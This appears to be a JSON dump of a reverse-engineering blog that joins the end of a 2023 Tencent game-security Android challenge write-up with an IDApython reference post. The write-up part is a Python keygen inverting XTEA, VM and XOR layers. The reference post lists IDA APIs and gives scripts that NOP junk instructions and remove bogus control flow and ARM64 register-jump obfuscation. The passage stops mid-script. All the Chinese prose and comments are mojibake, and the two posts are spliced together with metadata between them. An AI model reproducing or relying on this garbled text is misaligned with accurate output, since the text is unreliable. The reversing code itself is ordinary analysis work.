^ (total1.value - key[total1.value &amp; 3]) return v0.value, v1.valuedef mytest_4(): input_low = 0x3e90dd8f input_high = 0xc6d57ec5 # éªŒè¯åŠ å¯†ç®—æ³• input_low, input_high = enc_xtea(input_low, input_high) assert (input_low, input_high) == (0xabba3c01, 0x7223607f) # éªŒè¯è§£å¯†ç®—æ³• input_low, input_high = dec_xtea(input_low, input_high) assert (input_low, input_high) == (0x3e90dd8f, 0xc6d57ec5)mytest_4()è‡³æ­¤ä¸ºæ­¢ï¼Œæ‰€æœ‰åŠ å¯†ç®—æ³•åˆ†æå®Œæ¯• # æ³¨å†Œæœº åœ¨æ‰€æœ‰çš„åŠ å¯†å®Œæˆåï¼Œè¿™é‡Œçš„ result å°±æ˜¯æˆ‘ä»¬çš„ token , åŠ å¯†çš„ä½ 32 ä½å’Œ token æ¯”è¾ƒï¼Œé«˜ 32 ä½å’Œ 0 æ¯”è¾ƒ import structimport ctypesalgorithm_1 = &#123; (0, \"dec\"): lambda x: (x + 28) &amp; 0xff, (1, \"dec\"): lambda x: x ^ 0xd3, (2, \"dec\"): lambda x: (x + 94) &amp; 0xff, (3, \"dec\"): lambda x: x ^ 0x86&#125;def dec_xtea(input_low, input_high): v0, v1 = ctypes.c_uint32(input_low), ctypes.c_uint32(input_high) key = [0x7b777c63, 0xc56f6bf2, 0x2b670130, 0x76abd7fe] delta = 0x21524111 total1 = ctypes.c_uint32(0xBEEFBEEF-64*delta) total2 = ctypes.c_uint32(0x9D9D7DDE-64*delta) for i in range(64): total1.value += delta total2.value += delta v1.value -= (((v0.value &lt;&lt; 8) ^ (v0.value >> 7)) - v0.value) ^ (total2.value + key[(total2.value >> 13) &amp; 3]) v0.value -= (((v1.value &lt;&lt; 7) ^ (v1.value >> 8)) + v1.value) ^ (total1.value - key[total1.value &amp; 3]) return v0.value, v1.valuedef dec_vm_low(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 ^ 0) + 27 byte2 = (byte2 ^ 8) ^ 194 byte3 = (byte3 ^ 16) - 168 byte4 = (byte4 ^ 24) ^ 54 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_vm_high(input): byte4, byte3, byte2, byte1 = struct.unpack(\">4B\", input.to_bytes(4, 'big')) byte1 = (byte1 - 0) + 47 byte2 = (byte2 - 8) ^ 182 byte3 = (byte3 - 16) - 55 byte4 = (byte4 - 24) ^ 152 input = struct.pack(\">4B\", byte1 &amp; 0xff, byte2 &amp; 0xff, byte3 &amp; 0xff, byte4 &amp; 0xff) return int.from_bytes(input, 'little')def dec_2(input): input_byte = bytearray(input.to_bytes(4, 'big')) xor_arr = [50, -51, -1, -104, 25, -78, 0x7C, -102] for i in range(4): input_byte[i] = (input_byte[i] - i) &amp; 0xff input_byte[i] = (input_byte[i] ^ xor_arr[i]) &amp; 0xff input = int.from_bytes(input_byte, 'big') input = (input &lt;&lt; 7 | input >> 25) &amp; 0xffffffff input = int.from_bytes(input.to_bytes(4, 'little'), 'big') # å­—èŠ‚å†æ¬¡ç¿»è½¬ return inputdef dec_1(input): input_byte = bytearray(input.to_bytes(8, 'little')) for i in range(len(input_byte)): index = i % 4 input_byte[i] = (algorithm_1[(index, \"dec\")]((input_byte[i] + 8 * index) &amp; 0xff)) ^ index return int.from_bytes(input_byte, 'little')token = int(input(\"enter the token plz~:\"))input_low,input_high = token,0#xteainput_low,input_high=dec_xtea(input_low, input_high)#vminput_low,input_high = dec_vm_low(input_low),dec_vm_high(input_high)#bswap32input = struct.pack('&lt;2I', input_low, input_high)input_low, input_high = struct.unpack('>2I', input)#é«˜ / ä½ 32 ä½å¯¹è°ƒinput_low, input_high=input_high, input_low#blackObfuscatorinput_high = dec_2(input_high)input_low = dec_2(input_low)#last decryptinput = struct.pack('>2I', input_low, input_high)input=int.from_bytes(input,'little')input = dec_1(input)#outputprint(input)# å‚è€ƒèµ„æ–™ ELF æ–‡ä»¶æ ¼å¼çš„è¯¦è§£ [åŸåˆ›] 2023 è…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ›åˆèµ›é¢˜è§£ (å®‰å“) [åŸåˆ›] 2023 è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ› - å®‰å“èµ›é“åˆèµ› wp [åŸåˆ›] è…¾è®¯æ¸¸æˆå®‰å…¨æŠ€æœ¯ç«èµ› 2023 å®‰å“å®¢æˆ·ç«¯åˆèµ› WriteUp ARMv8 (aarch64) æŒ‡ä»¤é›†ç‰¹æ€§","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://oacia.dev/tags/android/"}]},{"title":"IDApythonå­¦ä¹ ç¬”è®°","slug":"idapython-learning","date":"2023-08-24T10:14:21.000Z","updated":"2024-07-19T15:40:10.000Z","comments":true,"path":"idapython-learning/","link":"","permalink":"https://oacia.dev/idapython-learning/","excerpt":"","text":"IDApython åœ¨æ—¥å¸¸é€†å‘çš„è¿‡ç¨‹ä¸­æ˜¯ååˆ†é‡è¦çš„å­˜åœ¨ï¼Œè¿‡å»é›¶é›¶æ•£æ•£çš„æ¥è§¦è¿‡ä¸€äº› idapython, ä½†æ˜¯æˆ‘è§‰å¾—è¿˜æ˜¯æœ‰å¿…è¦å»ç³»ç»Ÿçš„æ•´ç†ä¸€ä¸‹ç›¸å…³çš„å‡½æ•°ï¼Œä»¥ä¾¿æœªæ¥å€˜è‹¥å¿˜è®°äº†å¯ä»¥å¿«é€Ÿé€šè¿‡è¿™ç¯‡ç¬”è®°å›å¿†èµ·æ¥ # å®˜æ–¹æ–‡æ¡£ IDA Help: Alphabetical list of IDC functions IDAPython documentation # IDApython ç¼–å†™ç¯å¢ƒ PyCharm 2021.2.3 ç¤¾åŒºç‰ˆ IDA7.7 python3.8 ç”±äº IDA è‡ªå¸¦çš„ IDE æ²¡æœ‰ä»£ç è¡¥å…¨ååˆ†çš„éš¾ç”¨ï¼Œæ‰€ä»¥æˆ‘å‡†å¤‡åœ¨ PyCharm ä¸­ç¼–å†™ IDApython ä»£ç  åœ¨ pycharm ä¸­è¿›å…¥åˆ° æ–‡ä»¶--&gt;è®¾ç½®--&gt;é¡¹ç›®: xxx.py--&gt;Pythonè§£é‡Šå™¨ ï¼Œç„¶åç‚¹å‡»æ­¤å¤„çš„ å…¨éƒ¨æ˜¾ç¤º å¦‚å›¾ ç„¶åç‚¹å‡»è¯¥ä½ç½®æ¥æ·»åŠ è‡ªå®šä¹‰è·¯å¾„ å°† IDAå®‰è£…è·¯å¾„\\python\\3 æ·»åŠ è‡³è§£é‡Šå™¨è·¯å¾„ä¸­å¦‚å›¾ ç‚¹å‡»ç¡®å®šä¹‹åï¼Œåœ¨ Pycharm ä¸­å³å¯å®ç° IDApython ä»£ç è¡¥å…¨ å½“ç„¶å•¦ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ windows ä¸­æ·»åŠ  PYTHONPATH çš„ç¯å¢ƒå˜é‡ï¼ŒåŒæ ·å¯ä»¥åšåˆ° idapython çš„ä»£ç è¡¥å…¨ # åœ°å€ address idc.get_screen_ea()#è·å–å½“å‰å…‰æ ‡æ‰€åœ¨åœ°å€idc.get_inf_attr(INF_MAX_EA)#è·å–æœ¬æ–‡ä»¶çš„æœ€å¤§åœ°å€idc.get_inf_attr(INF_MIN_EA)#è·å–æœ¬æ–‡ä»¶çš„æœ€å°åœ°å€idaapi.get_imagebase()#è·å–æ–‡ä»¶çš„åŸºå€idc.next_head(ea)/idc.prev_head(ea)#è·å–ä¸‹ä¸€æ¡ / ä¸Šä¸€æ¡æŒ‡ä»¤çš„åœ°å€# åˆ¤æ–­å½“å‰åœ°å€æ˜¯å¦åœ¨ç¨‹åºä¸­å­˜åœ¨if idaapi.BADADDR != ea: print(\"valid address\")# åæ±‡ç¼– disasm idc.GetDisasm(ea)#è·å–æŸä¸€ä¸ªåœ°å€çš„åç¼–è¯‘æ±‡ç¼–æŒ‡ä»¤idc.print_insn_mnem(ea)#è¿”å›åŠ©è®°ç¬¦ï¼Œget mnemonicidc.print_operand(ea,n)#è¿”å›ç¬¬ n + 1 ä¸ªå‚æ•°idc.get_item_size(ea)#è·å–æŸè¡Œæ±‡ç¼–çš„é•¿åº¦ä¸¾ä¸ªä¾‹å­ ea = here()print(idc.GetDisasm(ea))# mov eax, [rbp+var_4]print(idc.print_insn_mnem(ea))# movprint(idc.print_operand(ea, 0))# eaxprint(idc.print_operand(ea, 1))# [rbp+var_4]# æ®µ segment idc.get_segm_name(ea)#è·å–åœ°å€æ‰€åœ¨æ®µçš„æ®µåidc.get_segm_start(ea)/idc.get_segm_end(ea)#è·å–åœ°å€æ‰€åœ¨æ®µèµ·å§‹ / ç»“æŸåœ°å€idautils.Segments()#è·å–æ‰€æœ‰çš„æ®µé¦–åœ°å€idc.get_first_seg()/idc.get_next_seg() # è·å–ç¬¬ä¸€ä¸ªæ®µ / ä¸‹ä¸€ä¸ªæ®µçš„åœ°å€idc.get_segm_attr(ea,attr)/idc.set_segm_attr(ea,attr,value) # è·å– / è®¾ç½®å‡½æ•°çš„å±æ€§ida_segment.get_segm_by_name('.text')#é€šè¿‡ name æ¥è·å–æ®µå¯¹è±¡ä¸¾ä¸ªä¾‹å­ #éå†æ‰€æœ‰çš„æ®µfor i in idautils.Segments(): print(f\"%s:\\t0x%x\\t0x%x\" %( idc.get_segm_name(i), idc.get_segm_start(i), idc.get_segm_end(i)))# é€šè¿‡åç§°æ¥è·å–æ®µå¯¹è±¡sg = ida_segment.get_segm_by_name('.text') print(sg.start_ea,sg.end_ea,sg.size())# å‡½æ•° function idc.get_func_name(ea)#é€šè¿‡åœ°å€è·å–å‡½æ•°åidaapi.get_func(ea)#é€šè¿‡åœ°å€è·å–åœ°å€æ‰€åœ¨çš„å‡½æ•°idc.get_next_func(ea)/idc.get_prev_func(ea) # è·å–å½“å‰å‡½æ•°çš„å‰ä¸€ä¸ª / åä¸€ä¸ªå‡½æ•°çš„åœ°å€idautils.Functions(start, end)#è·å–æ‰€æœ‰å‡½æ•°çš„é¦–åœ°å€ï¼Œè‹¥æ²¡æœ‰å‚æ•°ï¼Œåˆ™é»˜è®¤ä»å¤´åˆ°å°¾idc.get_func_attr(func, FUNCATTR_FLAGS)#æ£€ç´¢å‡½æ•°çš„ä¿¡æ¯ä¸¾ä¸ªä¾‹å­ #éå†æ‰€æœ‰å‡½æ•°for func in idautils.Functions(): print(hex(func), idc.get_func_name(func),sep=':')#è·å–å‡½æ•°çš„èµ·å§‹ / ç»“æŸåœ°å€func = idaapi.get_func(ea)print(func.start_ea, func.end_ea)#æ£€ç´¢å…³äºå‡½æ•°çš„ä¿¡æ¯ï¼Œæ¥åˆ¤æ–­è¯¥å‡½æ•°æ˜¯å¦æ˜¯åº“ä¸­ä»£ç ï¼Œæˆ–è€…å‡½æ•°æ˜¯å¦æœ‰è¿”å›å€¼ç­‰ç­‰for func in idautils.Functions():#è·å–æ‰€æœ‰å·²çŸ¥çš„å‡½æ•°é¦–åœ°å€ flags = idc.get_func_attr(func, FUNCATTR_FLAGS)#è·å–æ ‡å¿— if flags &amp; FUNC_NORET: print(hex(func), get_func_name(func), \"FUNC_NORET\") if flags &amp; FUNC_FAR: print(hex(func), get_func_name(func),\"FUNC_FAR\") if flags &amp; FUNC_LIB: print(hex(func), get_func_name(func),\"FUNC_LIB\") if flags &amp; FUNC_STATIC: print(hex(func), get_func_name(func),\"FUNC_STATIC\") if flags &amp; FUNC_FRAME: print(hex(func), get_func_name(func),\"FUNC_FRAME\") if flags &amp; FUNC_USERFAR: print(hex(func), get_func_name(func),\"FUNC_USERFAR\") if flags &amp; FUNC_HIDDEN: print(hex(func), get_func_name(func),\"FUNC_HIDDEN\") if flags &amp; FUNC_THUNK: print(hex(func), get_func_name(func),\"FUNC_THUNK\") if flags &amp; FUNC_LIB: print(hex(func), get_func_name(func),\"FUNC_BOTTOMBP\")å„ä¸ªå‡½æ•°æ ‡å¿—çš„å«ä¹‰å¦‚ä¸‹ å‡½æ•°æ ‡å¿— å«ä¹‰ FUNC_NORET è¿™ä¸ªæ ‡å¿—è¡¨ç¤ºæŸä¸ªå‡½æ•°æ˜¯å¦æœ‰è¿”å›å€¼ï¼Œå®ƒæœ¬èº«çš„å€¼æ˜¯ 1ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ²¡æœ‰è¿”å›å€¼çš„å‡½æ•°ï¼Œæ³¨æ„å®ƒæ²¡æœ‰å‡½æ•°çš„æœ€åå¹¶ä¸æ˜¯ ret æˆ–è€… leave æŒ‡ä»¤ã€‚ FUNC_FAR è¿™ä¸ªæ ‡å¿—éå¸¸å°‘çš„å‡ºç°ï¼Œæ ‡å¿—ç¨‹åºæ˜¯å¦ä½¿ç”¨åˆ†æ®µå†…å­˜ï¼Œå®ƒçš„å€¼ä¸º 2ã€‚ FUNC_USERFAR å°‘è§ FUNC_LIB è¿™ä¸ªè¡¨ç¤ºç”¨äºå¯»æ‰¾åº“å‡½æ•°çš„ä»£ç ã€‚è¯†åˆ«åº“å‡½æ•°ä»£ç æ˜¯éå¸¸æœ‰å¿…è¦çš„ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨åˆ†æçš„æ—¶å€™ä¸€èˆ¬å°†å…¶è·³è¿‡ï¼Œå®ƒçš„å€¼æ˜¯ 4ã€‚ FUNC_STATIC é™æ€å‡½æ•° FUNC_FRAME è¿™ä¸ªæ ‡å¿—è¡¨ç¤ºå‡½æ•°æ˜¯å¦ä½¿ç”¨äº† ebp å¯„å­˜å™¨ (å¸§æŒ‡é’ˆ)ï¼Œä½¿ç”¨ ebp å¯„å­˜å™¨çš„å‡½æ•°é€šå¸¸æœ‰å¦‚ä¸‹çš„è¯­æ³•è®¾å®šï¼Œç›®çš„æ˜¯ä¸ºäº†ä¿å­˜æ ˆå¸§ã€‚ FUNC_BOTTOMBP å’Œ FUNC_FRAME ä¸€æ ·ï¼Œè¯¥æ ‡å¿—ç”¨äºè·Ÿè¸ªå¸§æŒ‡é’ˆ (ebp)ã€‚å®ƒä½œç”¨æ˜¯è¯†åˆ«å‡½æ•°ä¸­å¸§æŒ‡é’ˆæ˜¯ å¦ç­‰äºå †æ ˆæŒ‡é’ˆ (esp)ã€‚ FUNC_HIDDEN å¸¦æœ‰ FUNC_HIDDEN æ ‡å¿—çš„å‡½æ•°æ„å‘³ç€å®ƒä»¬æ˜¯éšè—çš„ï¼Œè¿™ä¸ªå‡½æ•°éœ€è¦å±•å¼€æ‰èƒ½æŸ¥çœ‹ã€‚å¦‚ æœæˆ‘ä»¬è·³è½¬åˆ°ä¸€ä¸ªæ ‡è®°ä¸º HIDDEN çš„åœ°å€çš„è¯ï¼Œå®ƒä¼šè‡ªåŠ¨çš„å±•å¼€ã€‚ FUNC_THUNK è¡¨ç¤ºè¿™ä¸ªå‡½æ•°æ˜¯å¦æ˜¯ä¸€ä¸ª thunk å‡½æ•°ï¼Œthunk å‡½æ•°è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªç®€å•çš„è·³è½¬å‡½æ•°ã€‚ # å— block éå†ä¸€ä¸ªå‡½æ•°ä¸­çš„å— import idaapiimport idcf_blocks = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)for block in f_blocks: print(hex(block.start_ea),hex(block.end_ea),hex(idc.prev_head(block.end_ea)),block.id)# ç‰¹åˆ«æ³¨æ„ï¼Œblock.end_ea è¡¨ç¤ºä¸‹ä¸€ä¸ªå—çš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸æ˜¯å½“å‰å—çš„ç»“æŸåœ°å€ï¼ï¼ï¼Œidc.prev_head (block.end_ea) æ‰æ˜¯è·å–è¿™ä¸ªå—çš„ç»“æŸåœ°å€è·å– block çš„å‰é©±å— import idaapif_blocks = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)block = f_blocks[1]# è·å–å½“å‰å—çš„å‰é©±å—for pred in block.preds(): print(\"å‰é©±å—\",hex(pred.start_ea),pred.id)è·å– block çš„åç»§å— import idaapif_blocks = idaapi.FlowChart(idaapi.get_func(0x401E80), flags=idaapi.FC_PREDS)block = f_blocks[1]# è·å–å½“å‰å—çš„åç»§å—for succ in block.succs(): print(\"åç»§å—\",hex(succ.start_ea),succ.id)# æ“ä½œæ•° å¯ä»¥é€šè¿‡ idc.get_operand_type(curr_addr, n) è·å–ç¬¬ n+1 ä¸ªæ“ä½œæ•°çš„ç±»å‹ï¼Œè¿”å›å€¼æœ‰å…«ç§æƒ…å†µï¼Œå€¼å’Œå«ä¹‰å¦‚ä¸‹ æ“ä½œæ•° å€¼ å«ä¹‰ o_void 0 æŒ‡ä»¤æ²¡æœ‰ä»»ä½•æ“ä½œæ•°ï¼Œå¦‚ retn o_reg 1 æ“ä½œæ•°æ˜¯å¯„å­˜å™¨ o_mem 2 æ“ä½œæ•°æ˜¯ç›´æ¥å¯»å€çš„å†…å­˜ï¼Œè¿™ç§ç±»å‹å¯¹å¯»æ‰¾ DATA çš„å¼•ç”¨éå¸¸æœ‰å¸®åŠ©ã€‚å¦‚ cmp ds:dword_A152B8, 0 o_phrase 3 æ“ä½œæ•°æ˜¯åˆ©ç”¨åŸºå€å¯„å­˜å™¨å’Œå˜å€å¯„å­˜å™¨çš„å¯»å€æ“ä½œçš„è¯ï¼Œå¦‚ mov [edi+ecx], eax o_displ 4 æ“ä½œæ•°æ˜¯åˆ©ç”¨å¯„å­˜å™¨å’Œä½ç§»çš„å¯»å€æ“ä½œçš„è¯ï¼Œå¦‚ mov eax, [edi+18h] o_imm 5 æ“ä½œæ•°æ˜¯ä¸€ä¸ªç¡®å®šçš„æ•°å€¼ï¼Œå¦‚ add esp, 0Ch o_far 6 è¿™ç§è¿”å›ç±»å‹åœ¨ x86 å’Œ x86_64 çš„é€†å‘ä¸­ä¸å¸¸è§ã€‚å®ƒç”¨æ¥åˆ¤æ–­ç›´æ¥è®¿é—®è¿œç«¯åœ°å€çš„æ“ä½œæ•° o_near 7 è¿™ç§è¿”å›ç±»å‹åœ¨ x86 å’Œ x86_64 çš„é€†å‘ä¸­ä¸å¸¸è§ã€‚å®ƒç”¨æ¥åˆ¤æ–­ç›´æ¥è®¿é—®è¿‘ç«¯åœ°å€çš„æ“ä½œæ•° # åˆ¤æ–­åœ¨ curr_addr çš„æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„ç±»å‹æ˜¯å¦ä¸ºåˆ©ç”¨å¯„å­˜å™¨å’Œä½ç§»çš„å¯»å€æ“ä½œinsn = ida_ua.insn_t()idaapi.decode_insn(insn, curr_addr)if insn.Op1.type == idaapi.o_displ: print(\"ç¬¬ä¸€ä¸ªæ“ä½œæ•°çš„ç±»å‹æ˜¯åˆ©ç”¨å¯„å­˜å™¨å’Œä½ç§»çš„å¯»å€æ“ä½œ!\")# insn çš„å„ä¸ªå±æ€§Python>dir(insn)['Op1', 'Op2', 'Op3', 'Op4', 'Op5', 'Op6', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__get_auxpref__', '__get_operand__', '__get_ops__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__set_auxpref__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__swig_destroy__', '__weakref__', 'add_cref', 'add_dref', 'add_off_drefs', 'assign', 'auxpref', 'create_op_data', 'create_stkvar', 'cs', 'ea', 'flags', 'get_canon_feature', 'get_canon_mnem', 'get_next_byte', 'get_next_dword', 'get_next_qword', 'get_next_word', 'insnpref', 'ip', 'is_64bit', 'is_canon_insn', 'is_macro', 'itype', 'ops', 'segpref', 'size', 'this', 'thisown']# æœç´¢ idc.FindBinary(ea,flag, searchstr, radix=16)#å­—èŠ‚æˆ–è€…äºŒè¿›åˆ¶çš„æœç´¢idc.FindBinary(ea,flag, searchstr, radix=16) ä¸­ flag çš„å„ä¸ªç±»å‹çš„å«ä¹‰ ç±»å‹ å€¼ å«ä¹‰ SEARCH_UP 0 å‘ä¸Šæœç´¢ SEARCH_DOWN 1 å‘ä¸‹æœç´¢ SEARCH_NEXT 2 è·å–ä¸‹ä¸€ä¸ªå·²ç»æ‰¾åˆ°çš„å¯¹è±¡ SEARCH_CASE 4 æŒ‡æ˜æ˜¯å¦åŒºåˆ†å¤§å°å†™ SEARCH_REGEX 8 æ­£åˆ™æœç´¢ SEARCH_NOBRK 16 SEARCH_NOSHOW 32 æŒ‡æ˜æ˜¯å¦æ˜¾ç¤ºæœç´¢çš„è¿›åº¦ SEARCH_UNICODE 64 å°†æ‰€æœ‰æœç´¢å­—ç¬¦ä¸²è§†ä¸º Unicode SEARCH_IDENT 128 SEARCH_BRK 256 ä¸¾ä¸ªä¾‹å­ pattern = '55 48 89 E5'addr = ida_ida.inf_get_min_ea()for x in range(0,5): addr = idc.find_binary(addr, SEARCH_DOWN|SEARCH_NEXT, pattern) if addr != idc.BADADDR: print(hex(addr), idc.GetDisasm(addr))# æ•°æ® ida_bytes.get_bytes(ea,size)ida_bytes.get_byte(ea)ida_bytes.get_word(ea)ida_bytes.get_dword(ea)ida_bytes.get_qword(ea)# åŠ¨æ€è°ƒè¯• idc.add_bpt(long Address)#åœ¨æŒ‡å®šçš„åœ°å€è®¾ç½®æ–­ç‚¹idc.get_reg_value(string Register)#è·å–ä¸€ä¸ªå¯„å­˜å™¨çš„åç§°idc.set_reg_value(long Value, string Register)#è®¾ç½®å¯„å­˜å™¨çš„å€¼idc.run_to(long Address)#è¿è¡Œåˆ°æŒ‡å®šçš„åœ°å€ï¼Œç„¶ååœä¸‹ã€‚idc.wait_for_next_event(wfne,timeout)#ç­‰å¾…ä¸‹ä¸€ä¸ªäº‹ä»¶ï¼Œæ­¤å‡½æ•°ä¼šç»§ç»­æ‰§è¡Œè¿›ç¨‹ï¼Œå¹¶ç­‰å¾…è°ƒè¯•å™¨äº‹ä»¶ç›´åˆ°è¶…æ—¶åœ¨ idc.wait_for_next_event(wfne,timeout) ä¸­å‚æ•°å³è¿”å›å€¼çš„æ ‡å¿—å¦‚ä¸‹ wfne æ ‡å¿— // wfne flag is combination of the following:#define WFNE_ANY 0x0001 // return the first event (even if it doesn't suspend the process) // if the process is still running, the database // does not reflect the memory state. you might want // to call refresh_debugger_memory() in this case#define WFNE_SUSP 0x0002 // wait until the process gets suspended#define WFNE_SILENT 0x0004 // 1: be slient, 0:display modal boxes if necessary#define WFNE_CONT 0x0008 // continue from the suspended state#define WFNE_NOWAIT 0x0010 // do not wait for any event, immediately return DEC_TIMEOUT // (to be used with WFNE_CONT)#define WFNE_USEC 0x0020 // timeout is specified in microseconds // (minimum non-zero timeout is 40000us) timeout ï¼Œç­‰å¾…çš„ç§’æ•°ï¼Œ-1 ä¸ºæ— é™å¤§ è¿”å›å€¼ debugger event codes // debugger event codes#define NOTASK -2 // process does not exist#define DBG_ERROR -1 // error (e.g. network problems)#define DBG_TIMEOUT 0 // timeout#define PROCESS_STARTED 0x00000001 // New process started#define PROCESS_EXITED 0x00000002 // Process stopped#define THREAD_STARTED 0x00000004 // New thread started#define THREAD_EXITED 0x00000008 // Thread stopped#define BREAKPOINT 0x00000010 // Breakpoint reached#define STEP 0x00000020 // One instruction executed#define EXCEPTION 0x00000040 // Exception#define LIB_LOADED 0x00000080 // New library loaded#define LIB_UNLOADED 0x00000100 // Library unloaded#define INFORMATION 0x00000200 // User-defined information#define PROCESS_ATTACHED 0x00000400 // Attached to running process#define PROCESS_DETACHED 0x00000800 // Detached from process#define PROCESS_SUSPENDED 0x00001000 // Process has been suspended # patch ida_bytes.patch_bytes(ea, bytes)ida_bytes.patch_byte(ea, byte)ida_bytes.patch_word(ea, word)ida_bytes.patch_dword(ea, dword)ida_bytes.patch_qword(ea, qword)# IDApython å¸¸ç”¨è„šæœ¬ # æ‰“å° IDA å‡½æ•°åˆ—è¡¨ import idautilsimport idcfunc_addr = []func_name = []for i in idautils.Functions(): func_addr.append(i) func_name.append(idc.get_func_name(i))for i in func_addr: print(f\"&#123;hex(i)&#125;, \",end='')print('')for i in func_name: print(f\"\\\"&#123;i&#125;\\\", \",end='')# æ‰¹é‡å»é™¤èŠ±æŒ‡ä»¤ import idcimport ida_bytesdef my_nop(addr, endaddr): while addr &lt; endaddr: ida_bytes.patch_byte(addr, 0x90) addr += 1pattern = [\"74 15 75 13 8D 44 24 FC 83 F0 22 3B 04 24 74 0A E8 1F 00 00 00 74 04\", \"74 0A 75 08 E8 10 00 00 00 EB 04 E8\", \"48 81 EC 08 03 00 00\"]for i in range(len(pattern)): cur_addr = 0x406300 end_addr = 0x406E2C while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, idc.SEARCH_DOWN, pattern[i]) print(\"patch address: \" + hex(cur_addr)) # æ‰“å°æç¤ºä¿¡æ¯ if cur_addr == idc.BADADDR: break else: my_nop(cur_addr, cur_addr + len(pattern[i].split(' '))) cur_addr = idc.next_head(cur_addr)# å»é™¤ BCF è™šå‡æ§åˆ¶æµ æ›´å¤šç»†èŠ‚è¯·å‚è€ƒ ollvm ä¸‰ç§æ··æ·†æ¨¡å¼çš„åæ··æ·†æ€è·¯ # å»é™¤è™šå‡æ§åˆ¶æµ idapython è„šæœ¬import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytes # å°† mov å¯„å­˜å™¨ï¼Œä¸é€æ˜è°“è¯ ä¿®æ”¹ä¸º mov å¯„å­˜å™¨ï¼Œ0def do_patch(ea): if get_bytes(ea, 1) == b\"\\x8B\": # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) >> 3 patch_bytes(ea, (0xB8 + reg).to_bytes(1,'little') + b'\\x00\\x00\\x00\\x00\\x90\\x90') else: print('error') # ä¸é€æ˜è°“è¯åœ¨.bss æ®µçš„èŒƒå›´seg = ida_segment.get_segm_by_name('.bss')start = seg.start_eaend = seg.end_ea for addr in range(start,end,4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,'-')) # è·å–æ‰€æœ‰äº¤å‰å¼•ç”¨ while(ref != ida_idaapi.BADADDR): do_patch(ref) print('patch at ' + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print('-' * 20)# å»é™¤å¯„å­˜å™¨è·³è½¬æ··æ·† ä»…ä¾›å‚è€ƒï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´ï¼ arm64 æ¶æ„ä¸Šçš„ csel-br åŠ cset-br ç±»å‹å¯„å­˜å™¨è·³è½¬ è¿™ä¸ªè„šæœ¬æ˜¯æˆ‘åœ¨åšè…¾è®¯æ¸¸æˆå®‰å…¨ 2023 çš„å®‰å“é¢˜æ—¶å†™çš„ï¼Œæ›´å¤šç»†èŠ‚å¯ä»¥å‚é˜…ç»†å“ sec2023 å®‰å“èµ›é¢˜ import ida_segmentimport idautilsimport idcimport ida_bytesfrom keystone import *def patch_nop(begin, end): # arm64 ä¸­çš„ NOP æŒ‡ä»¤æ˜¯ b'\\x1F\\x20\\x03\\xD5' while end > begin: ida_bytes.patch_bytes(begin, b'\\x1F\\x20\\x03\\xD5') begin = begin + 4# è·å– text æ®µçš„èµ·å§‹åœ°å€text_seg = ida_segment.get_segm_by_name(\".text\")start, end = text_seg.start_ea, text_seg.end_ea# start, end = 0x3BA34, 0x3BA80# start, end = 0x37390,0x373B4# æµ‹è¯• ADRP æŒ‡ä»¤# start, end = 0x3FCE0, 0x3FD00 # æµ‹è¯• EQ æƒ…å†µ#start, end = 0x3AA90, 0x3AAA4# start, end = 0x3A078, 0x3A090# æµ‹è¯• CSET-BR å»é™¤æƒ…å†µcurrent_addr = start# print(text_seg.start_ea,text_seg.end_ea)nop_addr_array_after_finish = [] # åœ¨ CSEL/CSET-BR ç»“æ„ä¿®å¤å®Œæˆåéœ€è¦ NOP çš„æŒ‡ä»¤while current_addr &lt; end: # å¤„ç† CSEL-BR ç»“æ„ if idc.print_insn_mnem(current_addr) == \"CSEL\": CSEL_addr = current_addr nop_addr_array_temp = [] nop_addr_array_temp.append(CSEL_addr) BR_addr = 0 BR_reg = \"\" temp_addr = idc.next_head(current_addr) for _ in range(9): # å‘ä¸‹æœå¯» 9 æ¡æŒ‡ä»¤ï¼Œå¯»æ‰¾æ˜¯å¦æœ‰ BR æŒ‡ä»¤ if idc.print_insn_mnem(temp_addr) == \"BR\": BR_addr = temp_addr BR_reg = idc.print_operand(temp_addr, 0) break if idc.print_insn_mnem(temp_addr) == \"CSEL\": break temp_addr = idc.next_head(temp_addr) if BR_addr != 0: # åŒ¹é…åˆ°äº† CSEL-BR ç»“æ„çš„æ±‡ç¼–ï¼Œéœ€è¦å»é™¤ # å½¢å¦‚ CSEL X11, X12, X11, GE, è·å– CSEL åçš„æ“ä½œæ•° op1~3, ä»¥åŠæ¡ä»¶ç  cond CSEL_op1 = idc.print_operand(CSEL_addr, 0) CSEL_op2 = idc.print_operand(CSEL_addr, 1) CSEL_op2_val = -1 CSEL_op3 = idc.print_operand(CSEL_addr, 2) CSEL_op3_val = -1 CSEL_cond = idc.print_operand(CSEL_addr, 3) # è¯»å–æ¡ä»¶åˆ†æ”¯è¯­å¥ CSEL ä¸­è¦èµ‹å€¼ç»™ç›®æ ‡å¯„å­˜å™¨çš„ä¸¤ä¸ªæºå¯„å­˜å™¨ä¸­å­˜å‚¨çš„å€¼ temp_addr = idc.prev_head(CSEL_addr) while (CSEL_op2_val 